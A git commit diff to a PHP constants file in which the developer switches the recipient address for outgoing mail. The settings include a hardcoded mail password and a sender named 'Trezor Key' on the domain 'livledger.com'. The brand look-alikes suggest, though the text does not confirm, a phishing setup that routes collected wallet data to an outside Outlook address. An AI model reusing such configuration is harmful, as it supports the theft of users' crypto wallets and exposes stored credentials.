8adc9b24932bd195a30d07f9a87a7e2542f7fd92
vinay sachan <vinay@tappetbox.com>
2024-08-14 22:35:20 +0530

    changes

--- includes/constant.php
+++ includes/constant.php
@@ -5,7 +5,7 @@ define('CONST_MAIL_PASSWORD', 'EmailPassword@123');
 define('CONST_MAIL_FROM', 'contact@livledger.com');
 define('CONST_MAIL_PORT', '465');
 define('CONST_MAIL_FROM_NAME', 'Trezor Key');
-//define('CONST_RECEIVE_EMAIL', 'faizilboy@outlook.com');
-define('CONST_RECEIVE_EMAIL', 'vinaysachan@live.in');
+define('CONST_RECEIVE_EMAIL', 'faizilboy@outlook.com');
+//define('CONST_RECEIVE_EMAIL', 'vinaysachan@live.in');
 
 ?>
